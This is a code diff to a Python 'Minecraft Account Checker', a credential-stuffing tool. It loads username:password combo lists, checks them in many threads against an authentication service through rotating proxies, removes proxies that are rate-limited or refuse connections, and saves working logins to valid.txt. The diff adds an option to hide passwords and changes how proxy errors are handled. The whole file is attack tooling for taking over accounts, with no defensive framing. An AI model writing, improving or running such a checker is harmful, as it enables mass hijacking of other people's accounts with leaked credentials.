@@ -31,6 +31,7 @@ class Main:
         self.invalid = 0
         self.counter = 0
         self.valid = 0
+        self.hide = False
 
     def load_proxies(self):
         print(mark)
@@ -46,7 +47,7 @@ class Main:
                             pass
                 print(f"> Loaded [{len(self.proxy_list)}] proxies lines..\n")
             except Exception:
-                print("proxy error")
+                print(f'\nproxy error')
 
     def load_combos(self):
         if os.path.exists("combo.txt"):
@@ -59,8 +60,12 @@ class Main:
             return True
         print(mark)
         os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); 
-        print(f'{yellow}ERROR{white} : No combo file found: \'combo.txt\'');
-        combo = loader = open(fileopenbox(title="Load Combo List", default="*.txt"), 'r', encoding="utf8", errors='ignore').read().split('\n') 
+        print(mark)
+        print(f'> {yellow}ERROR{white} : No combo file found: \'combo.txt\'');
+        combo = loader = open(fileopenbox(title="Load Combo List", default="*.txt"), 'r', encoding="utf8", errors='ignore').read().splitlines()
+        for line in combo:
+            self.usernames.append(line.split(":")[0])
+            self.passwords.append(line.split(":")[-1])
         exit()
     
     def title(self):
@@ -82,27 +87,35 @@ class Main:
             ))
 
             if "accessToken" in check.json():
-                print(f'{green}[Good] {white}{username}:{password}')
+                if self.hide:
+                    print(f'{green}[Good] {white}{username}:{red}********')
+                else:
+                    print(f'{green}[Good] {white}{username}:{password}')
             elif "error" in check.json():
-                print(f'{red}[Bad] {white}{username}:{password}')
+                if self.hide:
+                    print(f'{red}[Bad] {white}{username}:{red}********')
+                else:
+                    print(f'{red}[Bad] {white}{username}:{password}')
             elif "The request could not be satisfied." in check.content:
                 print(f'{yellow}[Rate Limited] {white}the request could not be satisfied, removing proxy.')
                 self.proxy_list.remove(proxy)
             
             if "clientToken" in check.text:
-                with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
+                with open("valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
                 self.valid += 1
                 self.title()
             else:
                 self.invalid += 1
                 self.title()
-        except Exception:
-            pass
+        except Exception as err:
+            if "No connection could be made because the target machine actively refused it" in str(err):
+                self.proxy_list.remove(proxy)
+                print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
 
     def start_checking(self):
         def thread_starter():
             self.check_account(self.usernames[self.counter], self.passwords[self.counter])
-            
+
         while True:
             if threading.active_count() <= self.threads:
                 threading.Thread(target = thread_starter).start()
@@ -110,6 +123,11 @@ class Main:
             
             if self.counter >= len(self.usernames): break
         input()
+
+    def start(self):
+        os.system("cls")
+        self.load_proxies()
+        self.start_checking()
 
     def main(self):
         os.system("cls")
@@ -119,20 +137,32 @@ class Main:
             self.threads = int(input(f'{red}> {white}Threads: '))
             os.system("cls")
             print(mark)
-            self.retries = int(input(f'{red}> {white}Retries (0 = default, 3 max): '))
-            if self.retries == 0:
-                self.retries = 1
-            elif self.retries > 3 or self.retries < 1:
-                retries_old = self.retries
-                self.retries = 1
-                print(f'{red}Unexpected value ({retries_old}, new value {self.retries}')
-                
+            try:
+                passwords = int(input(f'{red}> {white}Hide passwords (default: 0 = no, 1 = yes): '))
+                if passwords == 1:
+                    self.hide = True
+                else:
+                    self.hide = False
+            except Exception:
+                passwords = 0
+
             os.system("cls")
-            self.load_proxies()
-            self.start_checking()
+            print(mark)
+            try:
+                self.retries = int(input(f'{red}> {white}Retries (default: 0, 3 max): '))
+                if self.retries == 0:
+                    self.retries = 1
+                elif self.retries > 3 or self.retries < 1:
+                    retries_old = self.retries
+                    self.retries = 1
+                    print(f'{red}Unexpected value ({retries_old}, new value {self.retries}')
+                    self.start()
+            except Exception:
+                self.retries = 1
+                self.start()
         else:
             os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); 
-            print(f'{yellow}ERROR{white} : Please put your combos inside of \'combo.txt\''); time.sleep(10); 
+            print(f'\n{yellow}ERROR{white} : Please put your combos inside of \'combo.txt\''); time.sleep(10); 
             exit()
-    
+            
 Main().main()
